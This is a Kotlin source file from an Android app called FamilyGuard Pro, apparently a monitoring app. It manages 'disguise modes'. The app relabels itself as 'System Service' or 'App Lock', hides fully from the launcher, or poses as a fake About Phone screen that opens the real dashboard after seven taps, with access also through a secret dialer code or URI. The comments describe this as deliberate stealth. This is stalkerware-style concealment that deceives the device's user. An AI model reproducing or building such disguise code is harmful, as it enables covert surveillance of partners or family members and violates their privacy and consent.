package com.familyguardpro

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.familyguardpro.utils.PreferenceManager

/**
 * Manages app disguise modes - switch between different launcher icons and app names
 * 
 * IMPORTANT: The application label in AndroidManifest is "System Service" by default.
 * This ensures that Settings > Apps, Running Services, and permission dialogs always show
 * "System Service" instead of "FamilyGuard Pro".
 * 
 * Modes:
 * - "normal" = FamilyGuard Pro visible in launcher (FamilyGuardLauncher alias enabled)
 * - "system" = System Service visible in launcher (SystemServiceLauncher alias enabled)
 * - "applock" = App Lock visible in launcher (AppLockLauncher alias enabled)
 * - "invisible" = FULLY INVISIBLE - No launcher entry at all (all aliases disabled)
 *                 Only visible in Settings > Apps as "System Service"
 *                 Access only via secret code or URI
 */
object AppDisguiseManager {
    
    private const val TAG = "AppDisguiseManager"
    
    // Component names for different launcher aliases
    private const val FAMILYGUARD_LAUNCHER = "com.familyguardpro.FamilyGuardLauncher"
    private const val SYSTEM_SERVICE_LAUNCHER = "com.familyguardpro.SystemServiceLauncher"
    private const val APP_LOCK_LAUNCHER = "com.familyguardpro.AppLockLauncher"
    private const val INVISIBLE_LAUNCHER = "com.familyguardpro.InvisibleLauncher"
    
    /**
     * Get current disguise mode
     */
    fun getCurrentMode(context: Context): String {
        return PreferenceManager(context).getDisguiseMode()
    }
    
    /**
     * Switch to normal FamilyGuard mode - shows "FamilyGuard Pro" in launcher
     * NOTE: Settings > Apps will still show "System Service" (by design for stealth)
     */
    fun switchToNormalMode(context: Context) {
        setComponentEnabled(context, FAMILYGUARD_LAUNCHER, true)
        setComponentEnabled(context, SYSTEM_SERVICE_LAUNCHER, false)
        setComponentEnabled(context, APP_LOCK_LAUNCHER, false)
        setComponentEnabled(context, INVISIBLE_LAUNCHER, false)
        
        PreferenceManager(context).setDisguiseMode("normal")
        Log.d(TAG, "Switched to NORMAL mode - FamilyGuard Pro visible in launcher")
    }
    
    /**
     * Switch to System Service mode - shows "System Service" in launcher
     * Settings > Apps will also show "System Service" (fully disguised)
     */
    fun switchToSystemMode(context: Context) {
        setComponentEnabled(context, FAMILYGUARD_LAUNCHER, false)
        setComponentEnabled(context, SYSTEM_SERVICE_LAUNCHER, true)
        setComponentEnabled(context, APP_LOCK_LAUNCHER, false)
        setComponentEnabled(context, INVISIBLE_LAUNCHER, false)
        
        PreferenceManager(context).setDisguiseMode("system")
        Log.d(TAG, "Switched to SYSTEM mode - System Service visible in launcher")
    }
    
    /**
     * Switch to App Lock disguise - shows "App Lock" in launcher
     */
    fun switchToAppLockMode(context: Context) {
        setComponentEnabled(context, FAMILYGUARD_LAUNCHER, false)
        setComponentEnabled(context, SYSTEM_SERVICE_LAUNCHER, false)
        setComponentEnabled(context, APP_LOCK_LAUNCHER, true)
        setComponentEnabled(context, INVISIBLE_LAUNCHER, false)
        
        PreferenceManager(context).setDisguiseMode("applock")
        Log.d(TAG, "Switched to APP LOCK mode")
    }
    
    /**
     * INVISIBLE MODE - Shows "System Service" in launcher but opens fake About Phone page
     * Clicking the app shows device info (like About Phone)
     * Tapping model number 7 times reveals the real dashboard
     */
    fun switchToInvisibleMode(context: Context) {
        Log.d(TAG, ">>> switchToInvisibleMode() called <<<")
        
        // Disable other launcher aliases
        Log.d(TAG, "Disabling FamilyGuardLauncher...")
        setComponentEnabled(context, FAMILYGUARD_LAUNCHER, false)
        
        Log.d(TAG, "Disabling SystemServiceLauncher...")
        setComponentEnabled(context, SYSTEM_SERVICE_LAUNCHER, false)
        
        Log.d(TAG, "Disabling AppLockLauncher...")
        setComponentEnabled(context, APP_LOCK_LAUNCHER, false)
        
        // Enable InvisibleLauncher - opens SystemInfoActivity (fake About Phone)
        Log.d(TAG, "Enabling InvisibleLauncher...")
        setComponentEnabled(context, INVISIBLE_LAUNCHER, true)
        
        PreferenceManager(context).setDisguiseMode("invisible")
        Log.d(TAG, "Switched to INVISIBLE mode - Opens fake About Phone when clicked")
        Log.d(TAG, "7 taps on device model reveals dashboard")
        
        // Note: Launcher will refresh automatically when component states change
        // No need to force refresh - Android handles this
    }
    
    /**
     * Truly hidden mode - No launcher entry at all
     * App only visible in Settings > Apps as "System Service"
     */
    fun switchToHiddenMode(context: Context) {
        Log.d(TAG, ">>> switchToHiddenMode() called <<<")
        
        // Disable ALL launcher aliases - completely hidden
        setComponentEnabled(context, FAMILYGUARD_LAUNCHER, false)
        setComponentEnabled(context, SYSTEM_SERVICE_LAUNCHER, false)
        setComponentEnabled(context, APP_LOCK_LAUNCHER, false)
        setComponentEnabled(context, INVISIBLE_LAUNCHER, false)
        
        PreferenceManager(context).setDisguiseMode("hidden")
        Log.d(TAG, "Switched to HIDDEN mode - No launcher entry at all")
        Log.d(TAG, "Access only via: *#*#00000#*#* or familyguard://open")
        
        // Note: Launcher will refresh automatically when component states change
        // No need to force refresh - Android handles this
    }

    /**
     * Alias for switchToHiddenMode for backward compatibility
     */
    fun hideFromLauncher(context: Context) {
        switchToHiddenMode(context)
    }
    
    /**
     * Apply the saved disguise mode - call this on app startup
     */
    fun applySavedMode(context: Context) {
        when (PreferenceManager(context).getDisguiseMode()) {
            "normal" -> switchToNormalMode(context)
            "system" -> switchToSystemMode(context)
            "applock" -> switchToAppLockMode(context)
            "invisible" -> switchToInvisibleMode(context)
            "hidden" -> switchToHiddenMode(context)
            else -> switchToNormalMode(context)
        }
    }
    
    /**
     * Check if app is currently disguised (not in normal mode)
     */
    fun isDisguised(context: Context): Boolean {
        val mode = PreferenceManager(context).getDisguiseMode()
        return mode != "normal" && mode.isNotEmpty()
    }
    
    /**
     * Check if app is in fully invisible mode
     */
    fun isInvisible(context: Context): Boolean {
        val mode = PreferenceManager(context).getDisguiseMode()
        return mode == "invisible" || mode == "hidden"
    }
    
    /**
     * Get the launcher display name based on current mode
     */
    fun getLauncherDisplayName(context: Context): String {
        return when (PreferenceManager(context).getDisguiseMode()) {
            "normal" -> "FamilyGuard Pro"
            "system" -> "System Service"
            "applock" -> "App Lock"
            "invisible", "hidden" -> "(Invisible)"
            else -> "FamilyGuard Pro"
        }
    }
    
    /**
     * Get the Settings/System display name (always System Service for stealth)
     */
    fun getSystemDisplayName(): String {
        return "System Service"
    }
    
    private fun setComponentEnabled(context: Context, componentName: String, enabled: Boolean) {
        try {
            val pm = context.packageManager
            val component = ComponentName(context.packageName, componentName)
            
            val newState = if (enabled) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            }
            
            pm.setComponentEnabledSetting(
                component,
                newState,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "Component $componentName set to ${if (enabled) "ENABLED" else "DISABLED"}")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set component $componentName: ${e.message}")
        }
    }
}
